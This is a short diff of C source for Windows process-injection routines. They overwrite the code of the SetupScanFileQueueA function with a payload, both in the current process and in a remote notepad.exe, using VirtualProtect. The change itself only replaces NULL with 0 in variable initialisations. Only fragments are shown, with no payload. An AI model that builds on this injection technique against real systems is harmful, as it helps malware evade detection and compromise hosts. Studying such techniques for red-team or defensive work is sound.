@@ -6,7 +6,7 @@
 
 BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     *pAddress = &SetupScanFileQueueA;
-	DWORD	dwOldProtection = NULL;
+	DWORD	dwOldProtection = 0;
 
 
 	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
@@ -26,9 +26,9 @@ BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN 
 
 BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
 	HANDLE		hProcess	= NULL;
-    DWORD	dwOldProtection = NULL;
-	DWORD		dwProcessId = NULL;
-	SIZE_T	sNumberOfBytesWritten = NULL;
+    DWORD	dwOldProtection = 0;
+	DWORD		dwProcessId = 0;
+	SIZE_T	sNumberOfBytesWritten = 0;
 
 	DebugPrint("[i] Function stomping into remote process notepad.exe\n");
 
